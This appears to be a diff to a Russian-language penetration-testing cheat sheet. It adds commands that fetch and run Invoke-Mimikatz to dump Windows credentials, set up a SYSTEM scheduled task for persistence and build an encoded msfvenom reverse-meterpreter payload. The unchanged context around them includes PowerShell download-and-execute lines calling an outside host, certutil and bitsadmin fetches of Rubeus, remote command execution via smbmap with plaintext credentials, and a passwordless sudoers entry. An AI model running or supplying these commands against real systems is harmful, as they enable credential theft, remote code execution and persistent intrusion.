@@ -79,6 +79,12 @@ usermod -aG user sudo
 echo 'user ALL=NOPASSWD: ALL' >> /etc/sudoers
 ```
 
+**Windows**
+
+```
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+powershell -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+```
 ## Active Directory
 
 Как получить учётную запись в AD:
@@ -172,6 +178,18 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://nur1.files.kz/r
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://nur1.files.kz/robots.txt')|iex"
 smbmap -u vboxuser -p Qwerty123 -H 172.16.1.1 -x 'certutil.exe -urlcache -f  http://172.16.1.3:8888/Rubeus.exe Rubeus.exe'
 bitsadmin /transfer myDownloadJob /download /priority normal http://172.16.1.3:8888/Rubeus.exe c:\Rubeus.exe
+```
+
+## Закрепление
+Windows
+
+```
+schtasks /create /tn Update /tr "file" /sc onlogon /ru System #minite
+```
+
+## Генерация нагрузки
+```
+msfvenom -p windows/meterpreter/reverse_winhttps lhost=172.16.7.2 lport=443 -e x86/xor_dynamic -f exe > idm4.exe
 ```
 
 ## RDP
